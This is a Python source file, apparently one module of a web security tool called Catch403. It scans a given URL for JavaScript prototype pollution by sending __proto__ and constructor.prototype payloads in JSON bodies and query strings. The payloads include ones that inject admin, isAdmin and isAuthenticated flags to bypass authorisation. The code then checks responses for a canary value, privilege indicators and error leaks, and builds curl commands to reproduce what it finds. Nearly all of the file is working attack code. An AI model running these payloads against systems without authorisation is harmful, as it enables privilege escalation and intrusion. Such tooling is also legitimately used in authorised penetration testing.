#!/usr/bin/python3
"""
Prototype Pollution Scanner — JavaScript Object Prototype Chain Injection.

Targets JSON endpoints and query parameters that merge user input into
JavaScript objects without sanitisation. A successful attack allows:
  - Property injection into global Object.prototype
  - Application logic bypass (admin=true, isAuthenticated=true)
  - DoS via __defineGetter__/__defineSetter__
  - RCE in Node.js via child_process / vm sandbox escape

Techniques tested:
  - JSON body: __proto__, constructor.prototype, Object.getPrototypeOf
  - Query string: ?__proto__[admin]=1, ?constructor[prototype][admin]=1
  - GET params: deep merge parameter injection
  - Header injection (rare but documented)

Detection: inject a unique canary property and look for it reflected in
subsequent requests or error messages.

Usage:
  ../.venv/bin/python3 modules/prototype_pollution.py -u https://target.com/api/settings \\
      -d '{"theme":"dark"}' --json
  ../.venv/bin/python3 modules/prototype_pollution.py -u "https://target.com/search?q=test"
"""
import argparse
import json
import re
import time
import urllib.parse
import uuid

import requests
import urllib3

from core.colors import bold, end, good, bad, info, run

urllib3.disable_warnings()

TIMEOUT = 15
UA      = {"User-Agent": "Catch403/1.0"}

# Unique canary values so we can spot them in responses
_CANARY_KEY   = "__pp_catch403__"
_CANARY_VAL   = f"pp_probe_{uuid.uuid4().hex[:8]}"


# ── payload sets ──────────────────────────────────────────────────────────

def _json_payloads() -> list[tuple[str, dict]]:
    """(label, body_dict) — JSON body payloads."""
    return [
        # Classic __proto__
        ("__proto__ key injection",
         {"__proto__": {_CANARY_KEY: _CANARY_VAL}}),

        # constructor.prototype
        ("constructor.prototype injection",
         {"constructor": {"prototype": {_CANARY_KEY: _CANARY_VAL}}}),

        # Nested merge attack (common in lodash.merge, jQuery.extend)
        ("Nested __proto__ in array",
         [{"__proto__": {_CANARY_KEY: _CANARY_VAL}}]),

        # Admin privilege escalation via prototype
        ("__proto__ admin=true",
         {"__proto__": {"admin": True, "isAdmin": True, "role": "admin",
                        "isAuthenticated": True, _CANARY_KEY: _CANARY_VAL}}),

        # DoS via constructor
        ("constructor.prototype DoS probe",
         {"constructor": {"prototype": {"toString": None, _CANARY_KEY: _CANARY_VAL}}}),

        # Double-encoded for JSON parse edge cases
        ("Stringified nested __proto__",
         json.loads('{"__proto__": {"' + _CANARY_KEY + '": "' + _CANARY_VAL + '"}}')),
    ]


def _query_payloads(base_url: str) -> list[tuple[str, str]]:
    """(label, full_url) — query string payloads."""
    p = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
    base_pairs = list(qs.items())

    canary_escaped = urllib.parse.quote(_CANARY_VAL)

    def _add(extra_qs: str) -> str:
        sep = "&" if p.query else ""
        new_q = p.query + sep + extra_qs if p.query else extra_qs
        return p._replace(query=new_q).geturl()

    return [
        ("__proto__[canary] param",
         _add(f"__proto__[{_CANARY_KEY}]={canary_escaped}")),

        ("constructor[prototype][canary] param",
         _add(f"constructor[prototype][{_CANARY_KEY}]={canary_escaped}")),

        ("__proto__[admin]=true",
         _add(f"__proto__[admin]=true&__proto__[isAdmin]=true&__proto__[{_CANARY_KEY}]={canary_escaped}")),

        ("__proto__[constructor][prototype][canary]",
         _add(f"__proto__[constructor][prototype][{_CANARY_KEY}]={canary_escaped}")),

        ("Object.prototype via URL path",
         _add(f"Object.prototype.{_CANARY_KEY}={canary_escaped}")),
    ]


# ── detection ─────────────────────────────────────────────────────────────

def _canary_reflected(r: requests.Response) -> bool:
    """Check if the canary value appears in the response body."""
    return _CANARY_VAL in r.text


def _privilege_indicators(r: requests.Response) -> list[str]:
    """Check for admin/privilege escalation indicators in the response."""
    indicators = []
    lower = r.text.lower()

    privilege_words = [
        "admin", "isadmin", "isadministrator", "superuser", "root",
        "isauthenticated", "authenticated", "privilege", "elevated",
    ]
    for word in privilege_words:
        if f'"{word}": true' in lower or f'"{word}":true' in lower:
            indicators.append(f'"{word}": true found in response')

    # Status code changes suggesting auth bypass
    if r.status_code in (200, 201, 302):
        indicators.append(f"200/302 after prototype pollution payload")

    return indicators


def _error_reveals_proto(r: requests.Response) -> list[str]:
    """Check if error messages leak prototype pollution processing."""
    error_patterns = [
        r"prototype",
        r"__proto__",
        r"cannot set property",
        r"cannot read propert",
        r"object object",
        r"mergeoptions",
        r"deepmerge",
        r"lodash",
    ]
    found = []
    lower = r.text.lower()
    for pat in error_patterns:
        if re.search(pat, lower):
            found.append(pat)
    return found


# ── baseline request ──────────────────────────────────────────────────────

def _get_baseline(url: str, headers: dict,
                  method: str = "GET", body: dict | None = None) -> requests.Response | None:
    try:
        if method == "GET":
            return requests.get(url, headers=headers, timeout=TIMEOUT, verify=False)
        return requests.post(url, json=body or {}, headers=headers,
                             timeout=TIMEOUT, verify=False)
    except Exception:
        return None


# ── scan ──────────────────────────────────────────────────────────────────

def scan(url: str, *,
         method: str = "GET",
         body: dict | None = None,
         headers: dict | None = None,
         test_json: bool = True,
         test_query: bool = True) -> list[dict]:
    hdrs = {**UA, **(headers or {})}
    findings: list[dict] = []

    baseline = _get_baseline(url, hdrs, method, body)

    # ── JSON body payloads ──────────────────────────────────────────────
    if test_json and method in ("POST", "PUT", "PATCH", "DELETE"):
        json_hdrs = {**hdrs, "Content-Type": "application/json"}
        for label, payload_dict in _json_payloads():
            try:
                r = requests.request(
                    method, url, json=payload_dict,
                    headers=json_hdrs, timeout=TIMEOUT, verify=False,
                )
            except Exception:
                continue

            if _canary_reflected(r):
                findings.append({
                    "name": f"Prototype Pollution (Reflected) — {label}",
                    "severity": "high",
                    "detail": (
                        f"Prototype pollution payload caused canary value to appear in response.\n"
                        f"Label: {label}\n"
                        f"Canary: {_CANARY_VAL} found in {len(r.text)}-byte response"
                    ),
                    "url": url,
                    "payload": json.dumps(payload_dict)[:200],
                    "evidence": r.text[:300],
                    "curl": (
                        f"curl -sk -X {method} '{url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{json.dumps(payload_dict)[:100]}'"
                    ),
                })
                continue

            # Check for privilege indicators
            privs = _privilege_indicators(r)
            if privs and baseline:
                baseline_privs = _privilege_indicators(baseline)
                new_privs = [p for p in privs if p not in baseline_privs]
                if new_privs:
                    findings.append({
                        "name": f"Prototype Pollution — Privilege Escalation Indicator",
                        "severity": "critical",
                        "detail": (
                            f"After prototype pollution payload, response contains privilege indicators.\n"
                            f"Indicators: {', '.join(new_privs)}\n"
                            f"Payload: {label}"
                        ),
                        "url": url,
                        "payload": json.dumps(payload_dict)[:200],
                        "evidence": r.text[:300],
                    })

            # Error-based leak
            errors = _error_reveals_proto(r)
            if errors:
                findings.append({
                    "name": f"Prototype Pollution — Error Disclosure",
                    "severity": "medium",
                    "detail": (
                        f"Response reveals prototype-related keywords suggesting vulnerable merge.\n"
                        f"Keywords: {', '.join(errors)}\n"
                        f"Payload: {label}"
                    ),
                    "url": url,
                    "payload": json.dumps(payload_dict)[:200],
                    "evidence": r.text[:200],
                })

    # ── Query string payloads ───────────────────────────────────────────
    if test_query:
        for label, injected_url in _query_payloads(url):
            try:
                r = requests.get(injected_url, headers=hdrs, timeout=TIMEOUT, verify=False)
            except Exception:
                continue

            if _canary_reflected(r):
                findings.append({
                    "name": f"Prototype Pollution (Query String) — {label}",
                    "severity": "high",
                    "detail": (
                        f"Query string prototype pollution reflected canary value.\n"
                        f"Label: {label}"
                    ),
                    "url": injected_url,
                    "payload": label,
                    "evidence": r.text[:200],
                    "curl": f"curl -sk '{injected_url}'",
                })

            errors = _error_reveals_proto(r)
            if errors:
                findings.append({
                    "name": "Prototype Pollution — Query String Error Disclosure",
                    "severity": "medium",
                    "detail": (
                        f"Query string payload reveals prototype-related keywords.\n"
                        f"Payload: {label}\nKeywords: {', '.join(errors)}"
                    ),
                    "url": injected_url,
                    "payload": label,
                    "evidence": r.text[:200],
                })

    if not findings:
        findings.append({
            "name": "No Prototype Pollution Detected",
            "severity": "info",
            "detail": (
                "No canary reflection or error disclosure detected. "
                "Note: server-side-only pollution (not reflected) requires "
                "manual verification or black-box gadget chaining."
            ),
        })
    return findings


# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Catch403 Prototype Pollution Scanner")
    parser.add_argument("-u", dest="url", required=True)
    parser.add_argument("-d", dest="body", default="",
                        help="JSON body template (will be replaced with payloads)")
    parser.add_argument("--method", default="POST",
                        help="HTTP method for body payloads (default: POST)")
    parser.add_argument("--no-json",  action="store_true", help="Skip JSON body tests")
    parser.add_argument("--no-query", action="store_true", help="Skip query string tests")
    parser.add_argument("--header", dest="headers", action="append", default=[],
                        metavar="NAME:VALUE")
    parser.add_argument("-o", dest="output", default="")
    args = parser.parse_args()

    custom_headers: dict = {}
    for h in args.headers:
        if ":" in h:
            k, v = h.split(":", 1)
            custom_headers[k.strip()] = v.strip()

    body_dict: dict | None = None
    if args.body:
        try:
            body_dict = json.loads(args.body)
        except json.JSONDecodeError:
            body_dict = {}

    _p = urllib.parse.urlparse(args.url)
    print(f"{run} Prototype pollution scan: {bold}{_p.netloc}{_p.path}{end}")

    results = scan(
        args.url,
        method=args.method.upper(),
        body=body_dict,
        headers=custom_headers,
        test_json=not args.no_json,
        test_query=not args.no_query,
    )

    for f in results:
        sev = f.get("severity", "info")
        icon = bad if sev == "critical" else (f"{bold}[{sev.upper()}]{end}" if sev != "info" else info)
        print(f"\n{icon} {bold}{f['name']}{end}")
        print(f"      {f.get('detail', '')[:160]}")

    if args.output:
        with open(args.output, "w") as fh:
            json.dump(results, fh, indent=2)
        print(f"\n{good} Saved to {args.output}")


if __name__ == "__main__":
    main()
